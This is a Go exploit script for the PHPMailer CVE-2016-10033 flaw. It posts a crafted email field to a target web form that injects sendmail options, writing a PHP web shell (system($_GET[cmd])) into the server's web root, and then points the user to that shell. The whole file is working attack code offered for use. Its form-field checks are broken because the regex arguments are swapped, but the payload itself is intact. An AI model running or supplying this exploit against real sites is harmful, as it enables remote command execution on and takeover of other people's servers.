package main

import(
    "fmt"
    "flag"
    "net/http"
    "os"
    "io/ioutil"
    "regexp"
    "net/url"
    "bytes"
)

// Do not modify this parameter. This is necessary for the exploit to work.
var target = flag.String("target", "http://target.com", "Target host to exploit")
var remote_location = flag.String("upload_to", "/var/www/", "Remote folder to upload the web shell.")

// Modify this to suit to your victim web-page.
var email_name = "email"
var subject_name = "subject"
var text_name = "text"
var shell_name = "shell.php" // The web-shell filename. Adjust this as it suits you.


func credits() {
    fmt.Println("zc00l exploit script for PHPMailer CVE-2016-10033\n");
}

func init() {
    credits()
}


func exploit(data string) {
    body_post := url.PathEscape(data)
    var body_post_bytes = []byte(body_post)
    resp, err := http.Post(*target, "application/x-www-form-urlencoded", bytes.NewReader(body_post_bytes))
    if err != nil {
        fmt.Printf("[!] Error sending post request: %s\n", err)
        os.Exit(1)
    }
    defer resp.Body.Close()
    body_byte, err := ioutil.ReadAll(resp.Body)
    _ = body_byte
    if err != nil {
        fmt.Printf("[!] Error reading the post response body.\n")
        os.Exit(1)
    }
    fmt.Printf("[+] Exploit packet has been sent.\n")
}

func get_page() (result string) {
    resp, err := http.Get(*target)
    if err != nil {
        fmt.Printf("Error sending GET request: %s", err)
        os.Exit(1)
    } else {
        defer resp.Body.Close()
        contents, err := ioutil.ReadAll(resp.Body)
        result = string(contents)
        if err != nil {
            fmt.Printf("Error reading page body: %s", err)
            os.Exit(1)
        }
    }
    return
}

func get_params(html string) (check bool) {
    // Check if the email parameter is present in the page.
    email_param, err := regexp.MatchString(email_name, "<input.*name="+email_name)
    if err != nil {
        fmt.Printf("[!] Error identifying email field: %s\n", err)
        os.Exit(1)
    }
    if email_param == true {
        fmt.Printf("[+] Email field has been found.\n")
    } else {
        fmt.Printf("[!] Could not find the email parameter.\n")
        os.Exit(1)
    }

    // Now we check if the subject parameter is in place.
    subject_param, err := regexp.MatchString(subject_name, "<input.*name="+subject_name)
    if err != nil {
        fmt.Printf("[!] Error identifying subject field: %s\n", err)
    }
    if subject_param == true {
        fmt.Printf("[+] Subject field has been found.\n")
    } else {
        fmt.Printf("[!] Could not find the subject parameter.\n")
        os.Exit(1)
    }

    // Now the last parameter check, the text field.
    text_param, err := regexp.MatchString(text_name, "<textarea.*name="+text_name)
    if err != nil {
        fmt.Printf("[!] Error identifying text field: %s\n", err)
        os.Exit(1)
    }
    if text_param == true {
        fmt.Printf("[+] Text field has been found.\n")
    } else {
        fmt.Printf("[!] Could not find the text parameter.\n")
    }
    check = true
    return
}

func main() {
    flag.Parse()
    println("[+] Requesting taget web-page: ", *target)
    var html_content = get_page()
    var check = get_params(html_content)
    if check == true {
        fmt.Printf("[+] Proceeding to exploitation\n")
    } else {
        fmt.Printf("[!] Exploit is unable to proceed into exploitation.\n")
    }

    var post_body = email_name + "=\"attacker@127.0.0.1\\\" -oQ/tmp/ -X"+*remote_location+"/"+shell_name+"  root\"@127.0.0.1&subject=&text=<?php system($_GET[cmd]);?>"
    exploit(post_body)
    println("\n\n[+] Check your web shell at "+*target+"/"+shell_name)
}
